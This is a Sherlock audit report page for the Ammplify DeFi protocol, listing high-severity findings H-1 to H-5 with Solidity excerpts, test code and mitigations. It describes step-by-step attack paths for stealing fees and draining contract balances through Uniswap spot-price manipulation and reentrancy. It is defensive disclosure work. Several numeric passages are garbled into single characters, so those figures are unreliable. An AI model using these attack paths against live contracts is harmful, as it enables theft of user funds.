r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nTotal Rewards\r\n\r\n80,000 USDC\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nStatus\r\n\r\nScope\r\n\r\nStart Time\r\n\r\nEnd Time\r\n\r\nJudging Rules\r\n\r\nFinished\r\n\r\n2,949 nSLOC\r\n\r\n2 Sept 2025, 16:00\r\n\r\n22 Sept 2025, 16:00\r\n\r\n8171fa8\r\n\r\ndefault\r\nLead Senior Watson\r\n\r\npanprog\r\n\r\ndefault\r\nLead Judge\r\n\r\ntsvetanovv\r\n\r\nThis contest has finished\r\n\r\nView Findings\r\nAudit Report\r\nLeaderboard\r\nIssue H-1: Accrued maker fees not yet compounded can be stolen by manipulating uniswap pool spot price to reduce fees equivalent liquidity and liquidity share price on maker liquidity deposit\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/35\r\n\r\nFound by\r\nMoZi, OxNoble, Razkky, Theseersec, Xmanuel, coin2own, djshaneden, francoHacker, g4t0r, har0507, panprog, soloking, spaceleaf, sweven, volleyking\r\n\r\nSummary\r\nWhen maker liquidity is added, the existing accumulated maker fees (which are not compounded into liquidity yet) are converted into liquidity equivalent and added to actual liquidity in order to calculate liquidity share price:\r\n\r\n  uint128 equivLiq = PoolLib.getEquivalentLiq(  \r\n      iter.lowTick,  \r\n      iter.highTick,  \r\n      node.fees.xCFees,  \r\n      node.fees.yCFees,  \r\n      data.sqrtPriceX96,  \r\n      true  \r\n  );  \r\n  // If this compounding liq balance overflows, the pool cannot be on reasonable tokens,  \r\n  // hence we allow the overflow error to revert. This won't affect other pools.  \r\n  compoundingLiq = node.liq.mLiq - node.liq.ncLiq + equivLiq;  \r\n  currentLiq = uint128(FullMath.mulDiv(compoundingLiq, sliq, node.liq.shares));  \r\n  // The shares we'll have afterwards.  \r\n  targetSliq = uint128(FullMath.mulDiv(node.liq.shares, targetLiq, compoundingLiq));  \r\nEquivalent liquidity is calculated from the fees (which are in token0 and token1 - node.fees.xCFees and node.fees.yCFees) using the current spot price:\r\n\r\n    function getEquivalentLiq(  \r\n        int24 lowTick,  \r\n        int24 highTick,  \r\n        uint256 x,  \r\n        uint256 y,  \r\n        uint160 sqrtPriceX96,  \r\n        bool roundUp  \r\n    ) internal pure returns (uint128 equivLiq) {  \r\n        (uint256 lxX128, uint256 lyX128) = getAmounts(sqrtPriceX96, lowTick, highTick, X128, roundUp);  \r\n        uint256 liqValueX128 = (FullMath.mulX64(lxX128, sqrtPriceX96, false) >> 32) + (lyX128 << 96) / sqrtPriceX96;  \r\n        uint256 myValue = FullMath.mulX128(x, uint256(sqrtPriceX96) << 32, false) + (y << 96) / sqrtPriceX96;  \r\n        if (roundUp) {  \r\n            equivLiq = SafeCast.toUint128(FullMath.mulDivRoundingUp(myValue, X128, liqValueX128));  \r\n        } else {  \r\n            equivLiq = SafeCast.toUint128(FullMath.mulDiv(myValue, X128, liqValueX128));  \r\n        }  \r\n    }  \r\nsqrtPriceX96 is set in Data from the current uniswap pool spot price:\r\n\r\n    function getSqrtPriceX96(address pool) internal view returns (uint160 sqrtPriceX96) {  \r\n        IUniswapV3Pool poolContract = IUniswapV3Pool(pool);  \r\n        (sqrtPriceX96, , , , , , ) = poolContract.slot0();  \r\n    }  \r\nEquivalent liquidity is calculated by dividing the value of fees at the current price by the value of 1 unit of liquidity at the current price. The issue is that equivalent liquidity amount depends on spot price, and spot price can be easily manipulated by the user.\r\n\r\nExample chart of equivalent liquidity depending on the price is given at this link\r\n\r\nThis allows attacker to manipulate spot price to a value, which makes the equivalent liquidity much smaller than at the correct spot price, deposit maker liquidity (at reduced liquidity share price), then manipulate spot price back to the correct value and remove maker liquidity (at correct liquidity share price). All of these actions can be done in 1 transaction, allowing attacker to also utilize flash loan to perform it.\r\n\r\nAfter such an attack, the pool maker assets will remain the same, but part of the fees will be given to attacker (fees stolen).\r\n\r\nRoot Cause\r\nEquivalent liquidity depends on spot price:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/Pool.sol#L243-L259\r\n\r\nInternal Pre-conditions\r\nLarge enough fees accured and not compounded on maker position.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nNote: a0 is used for amount of token0, a1 for amount of token1\r\n\r\nAttacker chooses liquidity range with a lot of makers fees accured. For example:\r\n1.1. Current price = 100, the range is [10;200]\r\n1.2. Liquidity deposited by makers = 10K (293 a0 + 68377 a1 = \r\n97677\r\n)\r\n1.3.\r\nF\r\ne\r\ne\r\ns\r\na\r\nc\r\nc\r\nu\r\nm\r\nu\r\nl\r\na\r\nt\r\ne\r\nd\r\n:\r\n977\r\n‘\r\na\r\n0\r\n‘\r\n=\r\n97677)1.3.Feesaccumulated:977‘a0‘=97700\r\n1.4. Liquidity value = 0.977\r\n1.5. Fees value = 9770\r\n1.6. Equivalent liquidity = 9770 / 0.977 = 10000\r\n1.7. liquidity share price = (10000 + 10000) / 10000 = 2.0\r\nAttacker manipulates spot price to 1:\r\n2.1. Spend: -2162 a0\r\n2.2. Get: +68377 a1\r\nAttacker deposits 10000 maker liquidity\r\n3.1. Liquidity composition at price = 1: 2455 a0 + 0 a1\r\n3.2. Liquidity value = 0.2455\r\n3.3. Fees value = 977\r\n3.4. Equivalent liquidity = 977 / 0.2455 = 3979\r\n3.5. liquidity share price = (10000 + 3979) / 10000 = 1.3979\r\n3.6. Deposit of 10000 liquidity, attacker spends: 2455 a0\r\n3.7. Attacker liquidity shares added: 7153\r\n3.8. After deposit, pool composition: 4910 a0, 0 a1, 17153 total liquidity shares\r\nAttacker manipulates spot price back to 100:\r\n4.1. Spend: -117287 a1\r\n4.2. Get: +4408 a0\r\nAttacker withdraws all his maker liquidity (7153 liquidity shares)\r\n5.1. Liquidity composition at price = 100: 502 a0 + 117287 a1\r\n5.2. Attacker receives 209 a0, 48910 a1, 407 a0 from fees\r\n5.3. After withdrawal, pool composition: 293 a0, 68377 a1, 10000 total liquidity shares\r\n5.4. Remaining fees: 570 a0 = $57000\r\nPool balances before attack: 293 a0, 68377 a1, fees: 977 a0\r\nPool balances after attack: 293 a0, 68377 a1, fees: 570 a0\r\n\r\nAttacker balances:\r\na0: -2162-2455+4408+209+407 = +407\r\na1: +68377-117287+48910 = 0\r\nmanipulation fees paid (0.3%): 2162 a0 * 0.003 + 4408 a0 * 0.003 = 7 + 13 = 20 a0\r\ntotal profit: +407 - 20 = +387 a0\r\n\r\nAttacker has stolen almost half of the maker fees in 1 transaction. The attack can be repeated or performed with a larger amount to steal higher percentage of the fees.\r\n\r\nImpact\r\nMost maker fees which were not yet compounded can be stolen by anyone in 1 transaction.\r\n\r\nNotes:\r\n\r\nIt only makes sense to steal fees when enough of them have accumulated due to manipulation fees. However, the manipulation fees are comparatively low, in the example above \r\n2000\r\nw\r\na\r\ns\r\nu\r\ns\r\ne\r\nd\r\ni\r\nn\r\nm\r\na\r\nn\r\ni\r\np\r\nu\r\nl\r\na\r\nt\r\ni\r\no\r\nn\r\nf\r\ne\r\ne\r\ns\r\no\r\nn\r\nl\r\ni\r\nq\r\nu\r\ni\r\nd\r\ni\r\nt\r\ny\r\nw\r\no\r\nr\r\nt\r\nh\r\n2000wasusedinmanipulationfeesonliquidityworth97677 (about 2% of liquidity). So the attack is profitable once at least 2% of maker fees are accumulated. And for pools with smaller fee (0.05%) this number is even smaller.\r\nThe chart of equivalent liquidity dependance on price can be different depending on fee composition, maker range and current price. However, in most combinations the attack above is possible by choosing the manipulation to a price with the smallest possible equivalent liquidity. In rare circumstances current price will already be in this minimum, either a different range can be chosen, or attacker can just wait until price moves away from this value.\r\nPoC\r\nNone\r\n\r\nMitigation\r\nCurrently withdrawals already handle such manipulation gracefully by only calculating the ratio of liquidity and fees to withdraw. Similar approach to maker liquidity deposit is possible to get rid of equivalent liquidity:\r\n\r\ndeposit user liquidity by fetching correct asset amounts from the user\r\nadditionally take corresponding share of maker fees from the user and deposit them to fees (increasing maker fees instead of maker liquidity)\r\nSuch approach will keep the liquidity share price the same regardless of price, but the maker fees will increase proportionally with any maker liquidity deposit. This also means that any user's share of fees will be the same after all deposits and withdrawals.\r\n\r\nIssue H-2: All taker collateral and collected fees can be stolen by re-entering via RFTLib.settle to manipulate uniswap spot price when adding Maker liquidity\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/58\r\n\r\nFound by\r\npanprog\r\n\r\nSummary\r\nWhen any user adds maker liquidity (via newMaker or adjustMaker), the amounts of token0 and token1 required from the user are calculated in the data.xBalance and data.yBalance, however the actual amounts spent to mint the required liquidity are never checked, the contract simply sends whatever amounts of both tokens are given by the uniswap pool in the mint callback. When the funds are settled for the maker liquidity change, the following functions are called:\r\n\r\n    RFTLib.settle(msg.sender, tokens, balances, rftData);  \r\n    PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\nRFTLib.settle calls user contract:\r\n\r\n    // If the payer is an RFTPayer, we make the request now.  \r\n    if (isRFTPayer) {  \r\n        cbData = IRFTPayer(payer).tokenRequestCB(tokens, balanceChanges, data);  \r\n    }  \r\nThis allows the user to manipulate the uniswap pool spot price to a different value via the RFTLib callback. PoolWalker.settle will then proceed to mint the required liquidity, but will use amounts of token0 and token1 different from the ones calculated and received from the user. Moreover, the total value of these tokens will always be higher than the value of tokens received from the user. When user manipulates the price back to initial value, he will have profit from this manipulation, stealing token0 and/or token1 from the contract.\r\n\r\nAs the contract uses Diamond proxy, this contract holds all token balances at the same address which is used to mint uniswap liquidity. In particular, the following funds are under risk:\r\n\r\nAll Takers collateral\r\nAll fees collected from the uniswap pool\r\nRoot Cause\r\nRe-entrancy in Maker.newMaker and Maker.adjustMaker which allows to manipulate uniswap pool before the pool positions are minted to the Ammplify:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L49-L50\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L79-L80\r\n\r\nInternal Pre-conditions\r\nNone.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nNote: a0 is used for amount of token0, a1 for amount of token1\r\n\r\nCurrent price = 100\r\nTakers have a total collateral of 100 a0 and 10000 a1 (these are contract balances)\r\nThere is liquidity of 1 in the range[100;10000]\r\nAttacker adds 111 maker liquidity in the range [100;10000], paying 10 a0\r\nIn the RFTLib.settle attacker manipulates the price to 10000\r\n4.1. Attacker pays a1: -90\r\n4.2. Attacker receives a0: +0.09\r\nAttacker returns from the RFTLib callback, 111 liquidity is minted to Ammplify, taking 10000 a1 from it\r\nAttacker manipulates the price back to 100:\r\n6.1. Attacker pays a0: -10\r\n6.2. Attacker receives a1: +10000\r\nAttacker waits for jit penalty time to pass and withdraws his 111 maker liquidity, receiving 10 a0\r\nContract balances:\r\n\r\nbefore: 100 a0 + 10000 a1 = $20000\r\nafter: 110 a0 + 0 a1 = $11000\r\nAttacker balances:\r\n\r\na0: -10 + 0.09 - 10 + 10 = -9.91 [-$991]\r\na1: -90 + 10000 = +9910 [+$9910]\r\nuniswap manipulation fees (0.3%): (90 + 10000) * 0.003 = -\r\n30\r\nT\r\no\r\nt\r\na\r\nl\r\n:\r\n30Total:9910 - \r\n991\r\n−\r\n991−30 = +$8889\r\nAttack is performed in a single transaction except the final withdrawal, however even with jit fees this is highly profitable to attacker. The same attack can be performed in a different direction (stealing most a0).\r\n\r\nThe attack allows to steal almost entire a0 and a1 balances of the Ammplify.\r\n\r\nImpact\r\nMost (90-99%) Ammplify contract balances can be stolen, including:\r\nTaker collateral\r\nUniswap fees collected but not yet claimed by the users\r\nWhen there are near-0 balances, multiple actions expecting positive balance will revert for users:\r\nTakers will be unable to get back their collateral\r\nNon-compounding Makers will be unable to adjust their balances, because all such actions will send them their expected uniswap pool fees, but the contract will not have them, so will revert with not enough funds.\r\nMitigation\r\nVerify that the amounts spent during uniswap mint match the amounts charged from the user.\r\n\r\nIssue H-3: Mismatch in actual pool's liquidity and pool node's liquidity infomation because of wrong route in PoolWalker.settle\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/208\r\n\r\nFound by\r\n0xAsen, 0xapple, 0xnija, 0xpinkman, Icon_0x, SOPROBRO, Sir_Shades, Theseersec, Xmanuel, anonymousjoe, crunter, maigadoh, neeloy, panprog, roshark, thimthor, v_2110\r\n\r\nSummary\r\nWhen WalkerLib.modify updates a pool’s nodes' information, the protocol subsequently calls PoolWalker.settle to update the actual pool state.\r\n\r\nHowever, PoolWalker.settle uses a different tree index for highTick compared to WalkerLib.modify.\r\n\r\nThis discrepancy can cause the settlement process to skip the correct right node, resulting in cases where the actual pool liquidity is not updated correctly.\r\n\r\nAs a result, the protocol may end up with mismatched liquidity between the node information and the actual pool state.\r\n\r\nThis is a critical issue because all fee calculations and liquidity accounting rely on incorrect pool liquidity data and further operations such as making new maker, new taker or remove maker related to the affected node would fail because of inconsistent pool state.\r\n\r\nRoot Cause\r\nIn WalkerLib.modify function, it calculates the tree index for highTick like below.\r\n\r\nuint24 high = pInfo.treeTick(highTick) - 1;  \r\nBut, in PoolWalker.settle function, it calculates the tree index for highTick differently(one increased: next index compaired to the previous one).\r\n\r\nuint24 high = pInfo.treeTick(highTick);  \r\nSo PoolWalker.settle function makes different route rather than WalkerLib.modify function.\r\n\r\nAs it walks through different route, it might fails to update correct right node.\r\n\r\nIn some cases, it updates correct right node as walking functions also going through sibling nodes, but it fails in other cases.\r\n\r\nInternal Pre-conditions\r\nCorrect tree index for highTick(pInfo.treeTick(highTick) - 1) and the next one(pInfo.treeTick(highTick)) is in such condition that it can't walk through the correct node when walking up from the wrong right node in the wrong route.\r\n\r\nExternal Pre-conditions\r\nNone\r\n\r\nAttack Path\r\nA Maker creates an asset(Asset A) with a tick range that meets internal pre-condition.\r\nAnother maker try to create an asset with an affected tick range(means that a range that walkers visits the affected node), but it would fail because there is no position for the affected node in the pool.\r\nA taker try to create an asset with an affected tick range, but it would fail because of the same reason.\r\nThe owner of Asset A try to remove the asset, but it would fail because of the same reason.\r\nImpact\r\nAs it doesn't update the correct right node's liquidity according to node's information, some balances remains in maker facet(in case of maker) and some liquidity would remains in pool(in case of taker).\r\n\r\nFurther operations related to the affected node would fail because of the discrepancy in actual pool's state and pool node's information.\r\n\r\nPoC\r\nTo check the discrepancy between right node's liquidity information and pool's actual state in that node's range, please add the below test code to the Ammplify\\test\\walkers\\Lib.t.sol and run forge test --mt testPoolWalkNotWorkCorrectly -vvvv.\r\n\r\nimport { Route, RouteImpl } from \"../../src/tree/Route.sol\";  \r\nimport { Key } from \"../../src/tree/Key.sol\";  \r\n  \r\nfunction testPoolWalkNotWorkCorrectly() public {  \r\n    // Generic data setup.  \r\n    PoolInfo memory pInfo = PoolLib.getPoolInfo(pools[0]);  \r\n    console.log(\"----------Pool's tree info----------\");  \r\n    console.log(\"Tree Width\", pInfo.treeWidth);  \r\n    console.log(\"Tick Spacing\", pInfo.tickSpacing);  \r\n    int24 lowTick;  \r\n    int24 highTick;  \r\n    lowTick = -150;  \r\n    highTick = 150;  \r\n    (Asset storage asset, ) = AssetLib.newMaker(msg.sender, pInfo, lowTick, highTick, 1e24, true);  \r\n    Data memory data = DataImpl.make(pInfo, asset, 0, type(uint160).max, 1e24);  \r\n    WalkerLib.modify(pInfo, lowTick, highTick, data);  \r\n  \r\n    uint24 low = pInfo.treeTick(lowTick);  \r\n    uint24 highInWalker = pInfo.treeTick(highTick) - 1;  \r\n    Route memory routeInWalker = RouteImpl.make(pInfo.treeWidth, low, highInWalker);  \r\n    Key left = routeInWalker.left;  \r\n    Key rightInWalker = routeInWalker.right;  \r\n  \r\n    uint24 highInPoolWalker = pInfo.treeTick(highTick);  \r\n    Route memory routeInPoolWalker = RouteImpl.make(pInfo.treeWidth, low, highInPoolWalker);  \r\n    Key rightInPoolWalker = routeInPoolWalker.right;  \r\n    console.log(\"----------Tree Indexes For rights----------\");  \r\n    console.log(\"In Walker\", highInWalker);  \r\n    console.log(\"In Pool Walker\", highInPoolWalker);  \r\n    console.log(\"----------Right Keys----------\");  \r\n    console.log(\"Walker right key's base\", rightInWalker.base());  \r\n    console.log(\"Walker right key's width\", rightInWalker.width());  \r\n    console.log(\"PoolWalker right key's base\", rightInPoolWalker.base());  \r\n    console.log(\"PoolWalker right key's width\", rightInPoolWalker.width());  \r\n  \r\n    console.log(\"----------After WalkerLib's modify called----------\");  \r\n    console.log(\"Left liq dirty status\", data.node(left).liq.dirty);  \r\n    console.log(\"Right liq dirty status\", data.node(rightInWalker).liq.dirty);  \r\n    console.log(\"PoolWalker's Right liq dirty status\", data.node(rightInPoolWalker).liq.dirty);  \r\n  \r\n    // Settle the positions for realism (later walks will try to collect expecting a position to be there).  \r\n    PoolWalker.settle(pInfo, lowTick, highTick, data);  \r\n    console.log(\"----------After Pool Settle----------\");  \r\n    console.log(\"Left liq dirty status\", data.node(left).liq.dirty);  \r\n    console.log(\"Right liq dirty status\", data.node(rightInWalker).liq.dirty);  \r\n    console.log(\"PoolWalker's Right liq dirty status\", data.node(rightInPoolWalker).liq.dirty);  \r\n    console.log(\"----------Right node's liquidity information(Required liquidity of right node)----------\");  \r\n    uint128 rightNodeLiquidity = uint128(data.node(rightInWalker).liq.net());  \r\n    console.log(\"Net Liquidity of node\", rightNodeLiquidity);  \r\n  \r\n    (int24 lowTickRight, int24 highTickRight) = rightInWalker.ticks(data.fees.rootWidth, data.fees.tickSpacing);  \r\n    uint128 poolLiq = PoolLib.getLiq(data.poolAddr, lowTickRight, highTickRight);  \r\n    console.log(\"----------Actual liquidity of the pool in the right node's tick range----------\");  \r\n    console.log(\"Liquidity of pool in right node's range\", poolLiq);  \r\n    assertNotEq(rightNodeLiquidity, poolLiq);  \r\n}  \r\nAlso to see the impacts of this discrepancy, please add below code to Ammplify\\test\\facets\\Maker.t.sol and run forge test --mt testMismatchBreaksFurtherOperationsRelatedToWrongNode -vvvv.\r\n(PS: Need to change (, address _pool, address _token0, address _token1) = setUpPool(); in the setUp function to (, address _pool, address _token0, address _token1) = setUpPool(500); to make it run successfully.)\r\n\r\nimport { console2 as console } from \"forge-std/console2.sol\";  \r\nimport { AmmplifyAdminRights } from \"../../src/facets/Admin.sol\";  \r\n  \r\nfunction testMismatchBreaksFurtherOperationsRelatedToWrongNode() public {  \r\n    bytes memory rftData = \"\";  \r\n    int24 lowTick1 = -150;  \r\n    int24 highTick1 = 150;  \r\n    uint256 balance0 = token0.balanceOf(address(makerFacet));  \r\n    uint256 balance1 = token1.balanceOf(address(makerFacet));  \r\n    console.log(\"---------------Balance Before Creating Maker---------------\");  \r\n    console.log(\"Toke0 balance\", balance0);  \r\n    console.log(\"Toke1 balance\", balance1);  \r\n  \r\n    uint256 assetId = makerFacet.newMaker(  \r\n        recipient,  \r\n        poolAddr,  \r\n        lowTick1,  \r\n        highTick1,  \r\n        liquidity,  \r\n        false,  \r\n        minSqrtPriceX96,  \r\n        maxSqrtPriceX96,  \r\n        rftData  \r\n    );  \r\n  \r\n    balance0 = token0.balanceOf(address(makerFacet));  \r\n    balance1 = token1.balanceOf(address(makerFacet));  \r\n    console.log(\"---------------Balance After Creating Maker---------------\");  \r\n    console.log(\"Toke0 balance\", balance0);  \r\n    console.log(\"Toke1 balance\", balance1);  \r\n  \r\n    int24 lowTick2 = 140;  \r\n    int24 highTick2 = 150;  \r\n    address recipient2 = makeAddr(\"otherUser\");  \r\n    rftData = \"\";  \r\n    // Below call reverts because it tries to collect fees in the range (140, 150)  \r\n    // while calling WalkerLib.modify funcion call as the node's info indicate that there are some liquidity in that range.  \r\n    // But, actually, there is no position created when the first maker is created  \r\n    vm.expectRevert();  \r\n    makerFacet.newMaker(  \r\n        recipient2,  \r\n        poolAddr,  \r\n        lowTick2,  \r\n        highTick2,  \r\n        liquidity,  \r\n        true,  \r\n        minSqrtPriceX96,  \r\n        maxSqrtPriceX96,  \r\n        rftData  \r\n    );  \r\n  \r\n    // Setup for taker operation  \r\n    uint160[2] memory sqrtPriceLimitsX96 = [MIN_SQRT_RATIO, MAX_SQRT_RATIO];  \r\n    uint160 freezeSqrtPriceX96 = 3 << 95;  \r\n    adminFacet.submitRights(address(this), AmmplifyAdminRights.TAKER, true);  \r\n    vm.warp(block.timestamp + 3 days);  \r\n    adminFacet.acceptRights();  \r\n    rftData = \"\";  \r\n  \r\n    // Reverts because of the same reason above  \r\n    vm.expectRevert();  \r\n    takerFacet.newTaker(  \r\n        recipient2,  \r\n        poolAddr,  \r\n        [lowTick2, highTick2],  \r\n        1e18,  \r\n        [0, 1],  \r\n        sqrtPriceLimitsX96,  \r\n        freezeSqrtPriceX96,  \r\n        rftData  \r\n    );  \r\n  \r\n    vm.startPrank(recipient);  \r\n    // Reverts as it doesn't have actual liquidity in pool for the affect node's range  \r\n    vm.expectRevert();  \r\n    rftData = \"\";  \r\n    makerFacet.removeMaker(  \r\n        recipient,  \r\n        assetId,  \r\n        uint128(minSqrtPriceX96),  \r\n        uint128(maxSqrtPriceX96),  \r\n        rftData  \r\n    );  \r\n    vm.stopPrank();  \r\n}  \r\nMitigation\r\nUse correct tree index in the route of PoolWalker.settle function.\r\n\r\nfunction settle(PoolInfo memory pInfo, int24 lowTick, int24 highTick, Data memory data) internal {  \r\n    uint24 low = pInfo.treeTick(lowTick);  \r\n    uint24 high = pInfo.treeTick(highTick) - 1; //@audit: should deduct 1 like WalkerLib.modify  \r\n    Route memory route = RouteImpl.make(pInfo.treeWidth, low, high);  \r\n    route.walk(down, up, phase, WalkerLib.toRaw(data));  \r\n}  \r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/14/files\r\n\r\nIssue H-4: Uncollected fees from user's NFT position are stuck in NFTManager if NFTManager.decomposeAndMint function is used\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/238\r\n\r\nFound by\r\n0x37, 0xpinkman, JeRRy0422, KiroBrejka, SarveshLimaye, Slayer, blockace, panprog\r\n\r\nSummary\r\nNFTManager.decomposeAndMint converts user's Uniswap V3 NFT position into Ammplify's Maker liquidity. The issue is that any uncollected fees are stuck in the NFTManager contract. These fees are collected in the UniV3Decomposer and sent to NFTManager contract:\r\n\r\n            // After primary transfer, sweep any dust the contract may still hold for this token  \r\n            uint256 residual = IERC20(token).balanceOf(address(this));  \r\n            if (residual > 0) {  \r\n                TransferHelper.safeTransfer(token, caller, residual);  \r\n            }  \r\nNotice that the funds are sent to caller, which is set to msg.sender (e.g. NFTManager) in nonReentrant modifier of the decompose function:\r\n\r\n    modifier nonReentrant {  \r\n        require(caller == address(0), ReentrancyAttempt());  \r\n        caller = msg.sender;  \r\n        _;  \r\n        caller = msg.sender;  \r\n    }  \r\n  \r\n    function decompose(  \r\n        uint256 positionId,  \r\n        bool isCompounding,  \r\n        uint160 minSqrtPriceX96,  \r\n        uint160 maxSqrtPriceX96,  \r\n        bytes calldata rftData  \r\n    ) external nonReentrant returns (uint256 newAssetId) {  \r\nAfter receiving funds from the decomposer, NFTManager never sends these to the user:\r\n\r\n        _currentTokenRequester = msg.sender;  \r\n  \r\n        // Decompose the Uniswap V3 position  \r\n        assetId = DECOMPOSER.decompose(positionId, isCompounding, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n  \r\n        // Clear the token requester context  \r\n        _currentTokenRequester = address(0);  \r\n  \r\n        // Mint NFT for the decomposed asset  \r\n        tokenId = _nextTokenId++;  \r\n        assetToToken[assetId] = tokenId;  \r\n        tokenToAsset[tokenId] = assetId;  \r\n        _currentSupply++;  \r\n  \r\n        _safeMint(msg.sender, tokenId);  \r\n  \r\n        emit PositionDecomposedAndMinted(positionId, assetId, tokenId, msg.sender);  \r\n    }  \r\nIt might expect to receive these collected fees via the RFTPayer interface, but this interface is never used in this call:\r\n\r\ndecomposer transfers funds to NFTManager directly, not via RFTPayer.\r\neven though decomposer specifies msg.sender (NFTManager) as recepient for Maker position, under the hood it uses RFTPayer interface on its caller (i.e. decomposer) instead of the recepient.\r\nThe funds in NFTManager remain until the first mintNewMaker operation, which sends all residual token amounts to MakerFacet, meaning these funds are then stuck in the MakerFacet contract.\r\n\r\nRoot Cause\r\nNo funds are sent to user after DECOMPOSER.decompose call (and RFTPayer interface is not used):\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/integrations/NFTManager.sol#L156-L173\r\n\r\nInternal Pre-conditions\r\nUser calls NFTManager.decomposeAndMint with position with uncollected fees\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nHappens always when internal pre-condition is met.\r\n\r\nImpact\r\nUser losses uncollected position fees\r\n\r\nMitigation\r\nAfter decomposer mints Maker liquidity, send residual amounts of both tokens to msg.sender, or use RFTPayer interface from decomposer to NFTManager. If RFTPayer interface is not used, do not set _currentTokenRequester in decomposeAndMint function since the interface is not used in it.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/38\r\n\r\nIssue H-5: Borrow fee uses APY as per-second rate, causing extreme overcharging\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/379\r\n\r\nFound by\r\nARMoh, SOPROBRO, blockace\r\n\r\nSummary\r\nThe borrow fee rate returned by the smooth rate curve is an annual percentage yield (APY), but the implementation multiplies it directly by elapsed seconds without annualizing. This treats an annual rate as if it were a per-second rate, inflating fees by roughly 31,536,000x over the intended amount. Borrowers are charged massive, unjustified fees even over short time intervals.\r\n\r\nRoot Cause\r\nThe function chargeTrueFeeRate in src/walkers/Fee.sol treats the APY returned by calculateRateX64 as a per-second rate by multiplying it by the elapsed seconds timeDiff without dividing by the number of seconds in a year.\r\n\r\n// src/walkers/Fee.sol  \r\n// ... inside FeeWalker.chargeTrueFeeRate(...)  \r\nuint256 timeDiff = uint128(block.timestamp) - data.timestamp; // Convert to 256 for next mult  \r\nuint256 takerRateX64 = timeDiff * data.fees.rateConfig.calculateRateX64(  \r\n    uint64((totalTLiq << 64) / totalMLiq)  \r\n);  \r\nHowever, the rate returned by the curve is an annualized rate. The library documents that the seconds-per-year (SPR) factor is 31,536,000 and distinguishes APR vs SPR:\r\n\r\n// lib/Commons/src/Math/SmoothRateCurveLib.sol  \r\n// ...  \r\n// SPR factor 31536000 = 365 * 24 * 60 * 60  \r\n// APR of 0.001% = 0.00001  \r\n// as a SPR = 0.00001 / 31536000 =  ...  \r\nTherefore, the correct computation must divide by 365 days to convert the annual rate to a per-second rate before applying timeDiff.\r\n\r\nInternal Pre-conditions\r\nThere is non-zero taker liquidity and borrow amount in the visited subtree/column so that fees are computed and applied.\r\nExternal Pre-conditions\r\nTime passes between taker open and close (even short intervals like minutes or hours).\r\nAttack Path\r\nTaker opens a position borrowing token X or Y in any range with non-zero utilization.\r\nEven after a short time 